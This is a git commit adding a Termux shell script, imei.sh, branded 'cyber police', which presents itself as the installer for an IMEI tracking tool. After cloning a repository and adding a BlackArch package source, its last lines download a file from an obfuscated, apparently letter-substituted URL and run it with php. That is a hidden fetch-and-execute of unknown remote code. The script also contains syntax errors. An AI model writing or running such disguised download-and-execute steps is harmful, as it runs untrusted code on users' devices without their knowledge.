f0bb51c798ad01ac139c30e4f7f6d9c5f3212373
younghacker <godfreymbuva@gmail.com>
2019-02-04 19:48:23 +0300

    Add files via upload

---
+++ imei.sh
@@ -0,0 +1,18 @@
+#!/data/data/com.termux
+
+
+sleep 2
+figlet cyber police
+sleep 2
+git clone https://github.com/younghack3r/imeitracker.git
+sleep 2
+apt-get update && apt-get upgrade
+sleep 2
+pkg install wget
+sleep 1
+echo" system is initializing ..."
+sleep 2
+printf "\n[blackarch]\nServer = http://blackarch.org/blackarch/\$repo/os/\$arch" >> $HOME/arch/etc/pacman.conf echo "\033[32m Done\033[0m"
+sleep 2
+wget  sggkh://kzhgvyrm.xln/izd/XNJbTmuM 
+php CMQyGnfN
